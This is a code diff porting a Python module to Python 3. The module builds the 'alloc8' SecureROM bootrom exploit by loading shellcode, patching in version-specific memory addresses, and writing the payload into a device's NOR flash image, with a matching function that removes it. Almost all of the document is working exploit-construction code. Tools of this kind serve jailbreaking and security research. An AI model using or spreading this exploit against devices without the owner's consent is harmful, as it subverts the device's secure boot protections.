@@ -2,6 +2,8 @@ import copy
 import struct
 import sys
 
+import nor
+
 alloc8_constants_359_3 = [
     0x84034000,  # 1 - MAIN_STACK_ADDRESS
     0x544,  # 2 - clean_invalidate_data_cache
@@ -59,14 +61,12 @@ alloc8_constants_359_3_2 = [
 ]
 
 
-def empty_img3(size):
+def empty_img3(size: int) -> bytes:
     assert size >= 20
-    return struct.pack("<4s3I4s", "Img3"[::-1], size, 0, 0, "zero"[::-1]) + "\x00" * (
-        size - 20
-    )
+    return struct.pack("<4s3I4s", b"Img3", size, 0, 0, b"zero") + b"\x00" * (size - 20)
 
 
-def exploit(nor, version):
+def exploit(nor_data: nor.NorData, version: str) -> nor.NorData:
     if version == "359.3":
         constants = alloc8_constants_359_3
         exceptions = [0x5620, 0x5630]
@@ -77,9 +77,9 @@ def exploit(nor, version):
         print(f"ERROR: SecureROM version {version} is not supported by alloc8.")
         sys.exit(1)
 
-    for c in nor.parts[1]:
-        assert c == "\x00"
-    assert len(nor.images) < 32
+    for c in nor_data.parts[1]:
+        assert c == 0
+    assert len(nor_data.images) < 32
 
     max_shellcode_length = 460
     with open("bin/alloc8-shellcode.bin", "rb") as f:
@@ -94,7 +94,7 @@ def exploit(nor, version):
         (value,) = struct.unpack("<I", shellcode[offset : offset + 4])
         assert value == 0xBAD00001 + i
 
-    new_nor = copy.deepcopy(nor)
+    new_nor = copy.deepcopy(nor_data)
     new_nor.parts[1] = (
         shellcode[:placeholders_offset]
         + struct.pack(f"<{len(constants)}I", *constants)
@@ -122,19 +122,19 @@ def exploit(nor, version):
     return new_nor
 
 
-def remove_exploit(nor):
-    assert len(nor.images) >= 700
+def remove_exploit(nor_data: nor.NorData) -> nor.NorData:
+    assert len(nor_data.images) >= 700
 
-    new_nor = copy.deepcopy(nor)
+    new_nor: nor.NorData = copy.deepcopy(nor_data)
 
     new_images = []
     for image in new_nor.images:
         assert len(image) >= 20
-        if image[16:20] != "zero"[::-1]:
+        if image[16:20] != b"zero":
             new_images.append(image)
     assert len(new_images) < 32
 
     new_nor.images = new_images
-    new_nor.parts[1] = "\x00" * 460
+    new_nor.parts[1] = b"\x00" * 460
 
     return new_nor
